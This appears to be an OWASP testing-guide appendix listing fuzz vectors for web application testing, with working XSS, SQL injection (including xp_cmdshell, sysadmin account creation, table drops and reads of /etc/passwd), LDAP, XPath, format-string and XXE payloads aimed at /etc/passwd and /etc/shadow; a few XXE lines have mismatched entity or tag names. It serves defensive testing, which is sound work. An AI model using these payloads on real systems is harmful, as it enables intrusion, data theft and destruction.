The following are fuzzing vectors which can be used with
[WebScarab](WebScarab "wikilink"), [JBroFuzz](JBroFuzz "wikilink"),
[WSFuzzer](WSFuzzer "wikilink"), [ZAP](ZAP "wikilink") or another
fuzzer. Fuzzing is the "kitchen sink" approach to testing the response
of an application to parameter manipulation. Generally one looks for
error conditions that are generated in an application as a result of
fuzzing. This is the simple part of the discovery phase. Once an error
has been discovered identifying and exploiting a potential vulnerability
is where skill is required.

### Fuzz Categories

In the case of stateless network protocol fuzzing (like HTTP(S)) two
broad categories exist:

  - Recursive fuzzing
  - Replacive fuzzing

We examine and define each category in the sub-sections that follow.

#### Recursive fuzzing

Recursive fuzzing can be defined as the process of fuzzing a part of a
request by iterating through all the possible combinations of a set
alphabet. Consider the case of:

    <nowiki>http://www.example.com/8302fa3b</nowiki>

Selecting "8302fa3b" as a part of the request to be fuzzed against the
set hexadecimal alphabet (i.e. {0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f}) falls
under the category of recursive fuzzing. This would generate a total of
16^8 requests of the form:

    <nowiki>http://www.example.com/00000000</nowiki>
    <nowiki>...</nowiki>
    <nowiki>http://www.example.com/11000fff</nowiki>
    <nowiki>...</nowiki>
    <nowiki>http://www.example.com/ffffffff</nowiki>

#### Replacive fuzzing

Replacive fuzzing can be defined as the process of fuzzing part of a
request by means of replacing it with a set value. This value is known
as a fuzz vector. In the case of:

    <nowiki>http://www.example.com/8302fa3b</nowiki>

Testing against Cross Site Scripting (XSS) by sending the following fuzz
vectors:

    <nowiki>http://www.example.com/>"><script>alert("XSS")</script>&</nowiki>
    <nowiki>http://www.example.com/'';!--"<XSS>=&{()}</nowiki>

This is a form of replacive fuzzing. In this category, the total number
of requests is dependent on the number of fuzz vectors specified.

The remainder of this appendix presents a number of fuzz vector
categories.

### Cross Site Scripting (XSS)

For details on XSS: [Cross-site Scripting
(XSS)](Cross-site_Scripting_\(XSS\) "wikilink")

`>"><script>alert("XSS")</script>&`
`"><STYLE>@import"javascript:alert('XSS')";</STYLE>`
`>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;`
` alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>`
` >%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>`
`'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'`
`">`
`>"`
`'';!--"<XSS>=&{()}`
`<IMG SRC="javascript:alert('XSS');">`
`<IMG SRC=javascript:alert('XSS')>`
`<IMG SRC=JaVaScRiPt:alert('XSS')> `
`<IMG SRC=JaVaScRiPt:alert("XSS<WBR>")>`
`<IMGSRC=java&<WBR>#115;crip&<WBR>#116;:a`
` le&<WBR>#114;t('X&#83<WBR>;S'&#41>`
`<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116:`
` &<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>`
` <IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74(`
` &<WBR>#x27&#x58&#x53&#x53&#x27&#x29>`
` <IMG SRC="jav	ascript:alert(<WBR>'XSS');">`
`<IMG SRC="jav`
`ascript:alert(<WBR>'XSS');">`
`<IMG SRC="javascript:alert(<WBR>'XSS');">`

### Buffer Overflows and Format String Errors

#### Buffer Overflows (BFO)

A buffer overflow or memory corruption attack is a programming condition
which allows overflowing of valid data beyond its prelocated storage
limit in memory.

For details on Buffer Overflows: [Testing for Buffer
Overflow](Testing_for_Buffer_Overflow_\(OWASP-DV-014\) "wikilink")

Note that attempting to load such a definition file within a fuzzer
application can potentially cause the application to crash.

`A x 5`
`A x 17`
`A x 33`
`A x 65`
`A x 129`
`A x 257`
`A x 513`
`A x 1024`
`A x 2049`
`A x 4097`
`A x 8193`
`A x 12288`

#### Format String Errors (FSE)

Format string attacks are a class of vulnerabilities that involve
supplying language specific format tokens to execute arbitrary code or
crash a program. Fuzzing for such errors has as an objective to check
for unfiltered user input.

An excellent introduction on FSE can be found in the USENIX paper
entitled: [Detecting Format String Vulnerabilities with Type
Qualifiers](http://research.microsoft.com/pubs/74359/01-shankar.pdfl)

Note that attempting to load such a definition file within a fuzzer
application can potentially cause the application to crash.

`%s%p%x%d`
`.1024d`
`%.2049d`
`%p%p%p%p`
`%x%x%x%x`
`%d%d%d%d`
`%s%s%s%s`
`%99999999999s`
`%08x`
`%%20d`
`%%20n`
`%%20x`
`%%20s`
`%s%s%s%s%s%s%s%s%s%s`
`%p%p%p%p%p%p%p%p%p%p`
`%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%`
`%s x 129`
`%x x 257`

#### Integer Overflows (INT)

Integer overflow errors occur when a program fails to account for the
fact that an arithmetic operation can result in a quantity either
greater than a data type's maximum value or less than its minimum value.
If a tester can cause the program to perform such a memory allocation,
the program can be potentially vulnerable to a buffer overflow attack.

`-1`
`0`
`0x100`
`0x1000`
`0x3fffffff`
`0x7ffffffe`
`0x7fffffff`
`0x80000000`
`0xfffffffe`
`0xffffffff`
`0x10000`
`0x100000`

### SQL Injection

This attack can affect the database layer of an application and is
typically present when user input is not filtered for SQL statements.

For details on Testing SQL Injection: [Testing for SQL
Injection](Testing_for_SQL_Injection_\(OWASP-DV-005\) "wikilink")

SQL Injection is classified in the following two categories, depending
on the exposure of database information (passive) or the alteration of
database information (active).

  - Passive SQL Injection
  - Active SQL Injection

Active SQL Injection statements can have a detrimental effect on the
underlying database if successfully executed.

#### Passive SQL Injection (SQP)

`'`
`|`
`|(elt(-3+5,bin(15),ord(10),hex(char(45))))`
`  `
`|`
`|6`
`'`
`|`
`|'6`
`(`
`|`
`|6)`
`' OR 1=1-- `
`OR 1=1`
`' OR '1'='1`
`; OR '1'='1'`
`%22+or+isnull%281%2F0%29+%2F*`
`%27+OR+%277659%27%3D%277659`
`%22+or+isnull%281%2F0%29+%2F*`
`%27+--+`
`' or 1=1--`
`" or 1=1--`
`' or 1=1 /*`
`or 1=1--`
`' or 'a'='a`
`" or "a"="a`
`') or ('a'='a`
`Admin' OR '`
`'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES--`
`) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES;`
`' having 1=1--`
`' having 1=1--`
`' group by userid having 1=1--`
`' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = tablename')--`
`' or 1 in (select @@version)--`
`' union all select @@version--`
`' OR 'unusual' = 'unusual'`
`' OR 'something' = 'some'+'thing'`
`' OR 'text' = N'text'`
`' OR 'something' like 'some%'`
`' OR 2 > 1`
`' OR 'text' > 't'`
`' OR 'whatever' in ('whatever')`
`' OR 2 BETWEEN 1 and 3`
`' or username like char(37);`
`' union select * from users where login = char(114,111,111,116);`
`' union select `
`Password:*/=1--`
`UNI/**/ON SEL/**/ECT`
`'; EXECUTE IMMEDIATE 'SEL' `
`|`
`| 'ECT US' `
`|`
`| 'ER'`
`'; EXEC ('SEL' + 'ECT US' + 'ER')`
`'/**/OR/**/1/**/=/**/1`
`' or 1/*`
`+or+isnull%281%2F0%29+%2F*`
`%27+OR+%277659%27%3D%277659`
`%22+or+isnull%281%2F0%29+%2F*`
`%27+--+&password=`
`'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > `
` @var select @var as var into temp end --`
` ' and 1 in (select var from temp)--`
`' union select 1,load_file('/etc/passwd'),1,1,1;`
`1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;`
`' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));`

#### Active SQL Injection (SQI)

`'; exec master..xp_cmdshell 'ping 10.10.1.2'--`
`CREATE USER name IDENTIFIED BY 'pass123'`
`CREATE USER name IDENTIFIED BY pass123 TEMPORARY TABLESPACE temp DEFAULT TABLESPACE users; `
`' ; drop table temp --`
`exec sp_addlogin 'name' , 'password'`
`exec sp_addsrvrolemember 'name' , 'sysadmin'`
`INSERT INTO mysql.user (user, host, password) VALUES ('name', 'localhost', PASSWORD('pass123'))`
`GRANT CONNECT TO name; GRANT RESOURCE TO name;`
`INSERT INTO Users(Login, Password, Level) VALUES( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) `
` + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)`

### LDAP Injection

For details on LDAP Injection: [Testing for LDAP
Injection](Testing_for_LDAP_Injection_\(OWASP-DV-006\) "wikilink")

`  `
`|`
`!`
`(`
`)`
`%28`
`%29`
`&`
`%26`
`%21`
`%7C`
`*`
`|`
`%2A%7C`
`*(`
`|(mail=*))`
`%2A%28%7C%28mail%3D%2A%29%29`
`*(`
`|(objectclass=*))`
`%2A%28%7C%28objectclass%3D%2A%29%29`
`*()`
`|%26'`
`admin*`
`admin*)((`
`|userPassword=*)`
`*)(uid=*))(`
`|(uid=*`

### XPATH Injection

For details on XPATH Injection: [Testing for XPath
Injection](Testing_for_XPath_Injection_\(OWASP-DV-010\) "wikilink")

`'+or+'1'='1`
`'+or+''='`
`x'+or+1=1+or+'x'='y`
`/`
`//`
`//*`
`*/*`
`@*`
`count(/child::node())`
`x'+or+name()='username'+or+'x'='y`

### XML Injection

Details on XML Injection here: [Testing for XML
Injection](Testing_for_XML_Injection_\(OWASP-DV-008\) "wikilink")

`var n=0;while(true){n++;}</script>]]>`
`<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>`
`<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>`
`<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo>`
`<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>`
`<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>`
`<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>`